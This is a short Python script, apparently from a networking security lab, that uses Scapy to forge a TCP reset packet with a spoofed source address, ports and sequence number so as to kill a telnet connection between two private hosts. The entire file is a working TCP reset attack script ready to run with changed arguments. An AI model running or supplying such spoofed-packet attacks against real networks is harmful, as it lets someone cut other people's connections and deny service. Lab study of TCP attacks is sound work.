#!/usr/bin/python3
from scapy.all import *

def rst_send(src, dst, sport, dport, seq):
    ip = IP(src=src, dst=dst)
    tcp = TCP(
            sport=sport,
            dport=dport,
            flags="R",
            seq=seq
            )
    packet = ip/tcp
    ls(packet)
    send(packet, verbose=0)


if __name__ == "__main__":
    # You should change arguments below
    client_src = "10.9.0.6"
    server_dst = "10.9.0.5"
    src_port = 58762
    dst_port = 23
    next_seq = 4198194898
    rst_send(
            src=client_src,
            dst=server_dst,
            sport=src_port,
            dport=dst_port,
            seq=next_seq
            )

    
